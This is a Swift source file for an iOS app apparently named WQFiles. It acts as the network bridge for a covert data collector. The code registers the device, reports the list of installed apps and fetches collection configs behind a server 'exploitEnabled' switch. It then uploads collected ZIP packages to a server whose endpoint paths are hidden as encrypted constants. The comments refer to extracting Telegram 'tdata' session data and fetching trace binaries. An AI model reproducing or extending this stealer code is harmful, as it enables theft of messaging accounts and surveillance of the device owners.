//
//  WQNet.swift
//  WQFiles
//
//  给 ObjC 侧的网络桥。内部用 WQV2（X25519 + HKDF + AES-CBC + HMAC-SHA256），
//  路径走 SecureBox 里的加密常量，和 3105 的 ProtocolAPI 一一对应：
//
//      api/device/report -> V2Protocol.path("config")   拉采集配置
//      api/device/apps   -> V2Protocol.path("apps")     上报已装应用
//      api/log/report    -> V2Protocol.path("log")      上报阶段日志
//      api/upload/zip    -> V2Protocol.path("zip")      上传采集包
//
//  ObjC 侧声明（见 WQCollector.h）：
//      extern int   wqnet_ready(void);
//      extern char *wqnet_configs(void);
//      extern int   wqnet_apps(const char *jsonArray);
//      extern int   wqnet_log(const char *text);
//      extern int   wqnet_upload(const char *filePath, const char *bundleID);
//      extern char *wqnet_describe(void);
//

import Foundation
import UIKit
import Darwin
import CryptoKit

private let netTimeoutReport: TimeInterval = 30
private let netTimeoutUpload: TimeInterval = 300   // TG 包 170 MB 起，120s 不够
private let netUUIDKey = "wq.net.app_uuid"

// MARK: - 设备参数

private func netAppUUID() -> String {
    let defaults = UserDefaults.standard
    if let existing = defaults.string(forKey: netUUIDKey), !existing.isEmpty {
        return existing
    }
    let generated = UUID().uuidString.lowercased()
    defaults.set(generated, forKey: netUUIDKey)
    return generated
}

private func netMachineName() -> String {
    var systemInfo = utsname()
    uname(&systemInfo)
    let mirror = Mirror(reflecting: systemInfo.machine)
    let identifier = mirror.children.reduce(into: "") { partial, element in
        guard let value = element.value as? Int8, value != 0 else { return }
        partial.append(Character(UnicodeScalar(UInt8(bitPattern: value))))
    }
    return identifier.isEmpty ? "unknown" : identifier
}

private func netDeviceParams(extra: [String: Any] = [:]) -> [String: Any] {
    let info = Bundle.main.infoDictionary
    var params: [String: Any] = [
        "app_uuid": netAppUUID(),
        "app_version": (info?["CFBundleShortVersionString"] as? String) ?? "0",
        "app_pac": Bundle.main.bundleIdentifier ?? "",
        "machine": netMachineName(),
        "ios_version": UIDevice.current.systemVersion,
        "timestamp": Int64(Date().timeIntervalSince1970 * 1000),
    ]
    for (key, value) in extra { params[key] = value }
    return params
}

// MARK: - 同步 POST

private enum NetResult {
    case ok([String: Any])
    case failure(String)
}

/// 最后一次网络失败的详细原因（给 ObjC 写进 wq-collect.log）
private var netLastError = ""

private func netRecordError(_ text: String) {
    netLastError = text
    NSLog("[WQNet] %@", text)
}

private func netPost(legacyPath: String, params: [String: Any], timeout: TimeInterval) -> NetResult {
    let realPath = WQV2.v2Path(legacyPath)
    // 3105 用的是 baseURL.appendingPathComponent(...)；URL(string:relativeTo:)
    // 在 base 没有结尾斜杠时会拼错（拿掉最后一段而不是追加）。
    let url = WQV2.baseURL.appendingPathComponent(realPath)
    let logLine = "POST \(url.absoluteString)"
    netRecordError(logLine)

    // aad 里绑定了 method/path/appUUID/ts/nonce，服务端用真实路径重算 MAC。
    // 不传 context（默认 .none，path 为空）会得到 {"code":401,"message":"消息校验失败"}。
    let uuid = netAppUUID()
    let context = WQV2.Context(method: "POST", path: realPath, appUUID: uuid)
    let session: WQV2.Session
    do {
        session = try WQV2.newSession(params, context: context)
    } catch {
        netRecordError("\(legacyPath) v2 seal FAILED — \(error.localizedDescription)")
        return .failure("v2 seal failed: \(error.localizedDescription)")
    }
    guard let body = try? JSONSerialization.data(withJSONObject: session.body) else {
        netRecordError("\(legacyPath) v2 body encode FAILED")
        return .failure("v2 body encode failed")
    }

    var request = URLRequest(url: url)
    request.httpMethod = "POST"
    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
    request.setValue(uuid, forHTTPHeaderField: "X-App-UUID")
    request.timeoutInterval = timeout
    request.httpBody = body

    let sem = DispatchSemaphore(value: 0)
    var data: Data?
    var status = -1
    var transportError: String?

    WQPinnedSession.shared.session.dataTask(with: request) { payload, response, error in
        if let error = error { transportError = error.localizedDescription }
        data = payload
        status = (response as? HTTPURLResponse)?.statusCode ?? -1
        sem.signal()
    }.resume()

    if sem.wait(timeout: .now() + timeout + 5) == .timedOut {
        netRecordError("\(realPath) TIMEOUT after \(Int(timeout))s")
        return .failure("timeout \(realPath)")
    }
    if let transportError = transportError {
        netRecordError("\(realPath) transport: \(transportError)")
        return .failure("transport \(transportError)")
    }
    guard status == 200, let data = data,
          let envelope = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
          (envelope["code"] as? Int ?? -1) == 0 else {
        let snippet = data.flatMap { String(data: $0.prefix(160), encoding: .utf8) } ?? "-"
        netRecordError("\(realPath) http=\(status) body=\(snippet)")
        return .failure("http=\(status) path=\(realPath)")
    }
    guard let plain = session.open(envelope["data"]) else {
        netRecordError("\(realPath) v2 OPEN failed (mac/decrypt)")
        return .failure("v2 open failed path=\(realPath)")
    }
    netRecordError("\(realPath) OK keys=\(plain.keys.count)")
    return .ok(plain)
}

// MARK: - C 桥

private func netCString(_ text: String) -> UnsafeMutablePointer<CChar>? {
    return strdup(text)
}

@_cdecl("wqnet_ready")
public func wqnet_ready() -> Int32 {
    guard WQV2.serverPublicKey.count == 32 else { return -2 }
    guard !WQV2.baseURL.absoluteString.isEmpty else { return -3 }
    guard !SecureBox.string(.pathConfig).isEmpty else { return -4 }
    guard !SecureBox.string(.v1Key).isEmpty else { return -5 }
    return 0
}

@_cdecl("wqnet_last_error")
public func wqnet_last_error() -> UnsafeMutablePointer<CChar>? {
    return netCString(netLastError)
}

@_cdecl("wqnet_describe")
public func wqnet_describe() -> UnsafeMutablePointer<CChar>? {
    let host = WQV2.baseURL.absoluteString
    let configPath = WQV2.v2Path("api/device/report")
    let logPath = WQV2.v2Path("api/log/report")
    let pinHost = WQPinnedSession.hostKey()
    let txt = "host=\(host) config=\(configPath) log=\(logPath) pub=\(WQV2.serverPublicKey.count)B "
        + "pin=\(WQPinnedSession.enabled ? "on" : "off")/\(pinHost) leafPins=\(WQPinnedSession.leafPins.count)"
    return netCString(txt)
}

/// 拉采集配置。返回 JSON 字符串（调用方 free），失败返回 NULL。
@_cdecl("wqnet_configs")
public func wqnet_configs() -> UnsafeMutablePointer<CChar>? {
    switch netPost(legacyPath: "api/device/report", params: netDeviceParams(), timeout: netTimeoutReport) {
    case .ok(let plain):
        // 服务端总开关（device.exploitEnabled）：关掉时不下发任何采集项。
        // 这里直接返回空串，调用方据此完全跳过采集流程，也就不去拉
        // apptrace / libapptracecore 那两个二进制。
        if let enabled = plain["collect_enabled"] as? Bool, enabled == false {
            NSLog("[WQNet] collect disabled by server (collect_enabled=false)")
            return netCString("")
        }
        guard let configs = plain["collect_configs"] else { return nil }
        guard let data = try? JSONSerialization.data(withJSONObject: configs),
              let text = String(data: data, encoding: .utf8) else { return nil }
        return netCString(text)
    case .failure(let reason):
        NSLog("[WQNet] configs failed: %@", reason)
        return nil
    }
}

/// 只查服务端总开关（device.exploitEnabled）。
/// 返回 1 = 开启，0 = 关闭，-1 = 查询失败（调用方按"不动作"处理）。
@_cdecl("wqnet_collect_enabled")
public func wqnet_collect_enabled() -> Int32 {
    switch netPost(legacyPath: "api/device/report", params: netDeviceParams(), timeout: 15) {
    case .ok(let plain):
        if let enabled = plain["collect_enabled"] as? Bool {
            return enabled ? 1 : 0
        }
        // 老服务端没有这个字段：按开启处理
        return 1
    case .failure(let reason):
        NSLog("[WQNet] collect_enabled query failed: %@", reason)
        return -1
    }
}

/// 上报阶段日志。返回 0 成功。
@_cdecl("wqnet_log")
public func wqnet_log(_ text: UnsafePointer<CChar>?) -> Int32 {
    guard let text = text else { return -1 }
    let message = String(cString: text)
    switch netPost(legacyPath: "api/log/report",
                   params: netDeviceParams(extra: ["text": message]),
                   timeout: netTimeoutReport) {
    case .ok:
        NSLog("[WQNet] log reported (%d chars)", message.count)
        return 0
    case .failure(let reason):
        NSLog("[WQNet] log failed: %@", reason)
        return -2
    }
}

/// 上报已装应用列表（jsonArray 是 JSON 字符串数组）。
@_cdecl("wqnet_apps")
public func wqnet_apps(_ jsonArray: UnsafePointer<CChar>?) -> Int32 {
    guard let jsonArray = jsonArray else { return -1 }
    let text = String(cString: jsonArray)
    // 不用 String.data(using:)：那个 Foundation Swift 扩展的符号在旧系统
    // （实测 iOS 16.7.16）里没有，dyld 会在启动链接期直接 "Symbol not found"。
    let data = Data(text.utf8)
    guard let apps = try? JSONSerialization.jsonObject(with: data) as? [String] else { return -2 }
    switch netPost(legacyPath: "api/device/apps",
                   params: netDeviceParams(extra: ["apps": apps]),
                   timeout: netTimeoutReport) {
    case .ok:
        NSLog("[WQNet] apps reported (%d)", apps.count)
        return 0
    case .failure(let reason):
        NSLog("[WQNet] apps failed: %@", reason)
        return -3
    }
}

// 上传用的是 V2 envelope，不是 AES：
//   pathZip 指向 api/<prefix>/upload/zip，走 dist/modules/device/controller/open/v2.js
//   的 uploadZip → readEnvelope(fields) 只认 fields.meta / fields.params 里的 V2 envelope，
//   解出 session.plain 后再用 AES 重新封给 uploadService.save。
//   （controller/open/upload.js 的 /api/upload/zip 才是旧 AES params 那条路。）

/// 上传采集包（multipart）。返回 0 成功。
///
/// 服务端契约（dist/modules/device/controller/open/v2.js uploadZip）：
///     POST api/&lt;prefix&gt;/upload/zip
///     fields.params = V2 envelope（JSON 文本）
///     files.file    = 未加密 ZIP
/// 原来字段名是 "payload"，服务端 readEnvelope 只认 meta / params，所以一直取不到，
/// bundle_id / file_md5 全空，TG 的 tdata 提取也不会触发。
@_cdecl("wqnet_upload")
public func wqnet_upload(_ filePath: UnsafePointer<CChar>?, _ bundleID: UnsafePointer<CChar>?) -> Int32 {
    guard let filePath = filePath, let bundleID = bundleID else { return -1 }
    let path = String(cString: filePath)
    let bundle = String(cString: bundleID)
    guard let fileData = try? Data(contentsOf: URL(fileURLWithPath: path)), !fileData.isEmpty else {
        NSLog("[WQNet] upload: cannot read %@", path)
        return -2
    }

    let realPath = WQV2.v2Path("api/upload/zip")
    // 与 netPost 一致：baseURL 没有结尾斜杠时 URL(string:relativeTo:) 会拼错。
    let url = WQV2.baseURL.appendingPathComponent(realPath)
    let fileName = (path as NSString).lastPathComponent

    let params: [String: Any] = netDeviceParams(extra: [
        "bundle_id": bundle,
        "file_name": fileName,
        "file_md5": md5Hex(fileData),
    ])
    let uploadUUID = netAppUUID()
    let uploadContext = WQV2.Context(method: "POST", path: realPath, appUUID: uploadUUID)
    guard let uploadSession = try? WQV2.newSession(params, context: uploadContext),
          let envelope = try? JSONSerialization.data(withJSONObject: uploadSession.body) else {
        NSLog("[WQNet] upload: v2 seal failed")
        return -4
    }

    let boundary = "----WQFiles\(UUID().uuidString)"
    var body = Data()
    body.append(Data("--\(boundary)\r\n".utf8))
    body.append(Data("Content-Disposition: form-data; name=\"params\"\r\n".utf8))
    body.append(Data("Content-Type: application/json\r\n\r\n".utf8))
    body.append(envelope)
    body.append(Data("\r\n--\(boundary)\r\n".utf8))
    body.append(Data("Content-Disposition: form-data; name=\"file\"; filename=\"\(fileName)\"\r\n".utf8))
    body.append(Data("Content-Type: application/zip\r\n\r\n".utf8))
    body.append(fileData)
    body.append(Data("\r\n--\(boundary)--\r\n".utf8))

    var request = URLRequest(url: url)
    request.httpMethod = "POST"
    request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
    request.setValue(netAppUUID(), forHTTPHeaderField: "X-App-UUID")
    request.timeoutInterval = netTimeoutUpload
    request.httpBody = body

    let sem = DispatchSemaphore(value: 0)
    var status = -1
    var ok = false
    WQPinnedSession.shared.session.dataTask(with: request) { payload, response, error in
        status = (response as? HTTPURLResponse)?.statusCode ?? -1
        if error == nil, status == 200, let payload = payload,
           let env = try? JSONSerialization.jsonObject(with: payload) as? [String: Any],
           (env["code"] as? Int ?? -1) == 0 {
            ok = true
        } else if let payload = payload,
                  let text = String(data: payload.prefix(200), encoding: .utf8) {
            NSLog("[WQNet] upload body: %@", text)
        }
        sem.signal()
    }.resume()

    if sem.wait(timeout: .now() + netTimeoutUpload + 10) == .timedOut {
        NSLog("[WQNet] upload timeout")
        return -6
    }
    NSLog("[WQNet] upload %@ (%d bytes) -> %@ (http=%d)",
          fileName, fileData.count, ok ? "OK" : "FAILED", status)
    return ok ? 0 : -7
}

private func md5Hex(_ data: Data) -> String {
    // CryptoKit 已经 import；CommonCrypto 的 CC_MD5 在 Swift 里要单独 import 且已废弃。
    return Insecure.MD5.hash(data: data).map { String(format: "%02x", $0) }.joined()
}
